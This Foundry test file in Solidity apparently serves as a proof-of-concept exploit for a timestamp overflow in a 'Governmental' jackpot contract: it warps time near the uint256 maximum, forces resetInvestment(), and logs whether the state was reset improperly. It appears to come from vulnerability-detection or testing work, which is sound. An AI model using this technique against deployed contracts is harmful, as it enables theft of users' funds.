// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/governmental_survey.sol";

contract GovernmentalTest is Test {
    Governmental public gov;
    uint256 constant ONE_MINUTE = 60;

    function setUp() public {
        // Deploy with minimum required value
        gov = new Governmental{value: 1 ether}();
    }

    function testTimestampOverflow() public {
        // Setup max timestamp value that will overflow
        uint256 hugeTime = type(uint256).max - 59;
        vm.warp(hugeTime);
        
        // Update state by making investment
        gov.invest{value: 1 ether}();
        
        // Verify overflow in timestamp condition
        uint256 lastTime = gov.lastInvestmentTimestamp();
        assertEq(lastTime, hugeTime, "Last investment time error");
        
        // BEGIN DIFFERENTIAL CHECKS
        console.log("--- BEFORE state snapshot ---");
        address lastInvestorBefore = gov.lastInvestor();
        uint256 jackpotBefore = gov.jackpot();
        uint256 timestampBefore = gov.lastInvestmentTimestamp();
        uint256 totalWinnersBefore = gov.totalWinners();
        
        console.log("lastInvestor BEFORE:     ", lastInvestorBefore);
        console.log("jackpot BEFORE:         ", jackpotBefore);
        console.log("timestamp BEFORE:       ", timestampBefore);
        console.log("totalWinners BEFORE:    ", totalWinnersBefore);

        console.log("--- CRITICAL ACTION (Trigger) ---");
        // Should succeed despite min time limit due to overflow
        gov.resetInvestment();
        console.log("Executed: gov.resetInvestment()");
        
        console.log("--- AFTER state snapshot ---");
        address lastInvestorAfter = gov.lastInvestor();
        uint256 jackpotAfter = gov.jackpot();
        uint256 timestampAfter = gov.lastInvestmentTimestamp();
        uint256 totalWinnersAfter = gov.totalWinners();
        
        console.log("lastInvestor AFTER:     ", lastInvestorAfter);
        console.log("jackpot AFTER:         ", jackpotAfter);
        console.log("timestamp AFTER:       ", timestampAfter);
        console.log("totalWinners AFTER:    ", totalWinnersAfter);
        
        console.log("--- Differential Comparison ---");
        bool investorReset = lastInvestorAfter == address(0);
        bool jackpotSet = jackpotAfter == 1 ether;
        bool timestampReset = timestampAfter == 0;
        bool winnersIncreased = totalWinnersAfter == totalWinnersBefore + 1;
        
        console.log("Investor reset (expected 0):", investorReset);
        console.log("Jackpot reset (expected 1 ether):", jackpotSet);
        console.log("Timestamp reset (expected 0):", timestampReset);
        console.log("Winner count increment (expected +1):", winnersIncreased);

        // FINAL VERDICT
        bool vulnerabilityExploited = investorReset && jackpotSet && timestampReset && winnersIncreased;
        if (vulnerabilityExploited) {
            console.log("Vulnerability Exists: Overflow caused improper state reset");
        } else {
            console.log("Vulnerability not Exist: State not reset as expected");
        }
    }
}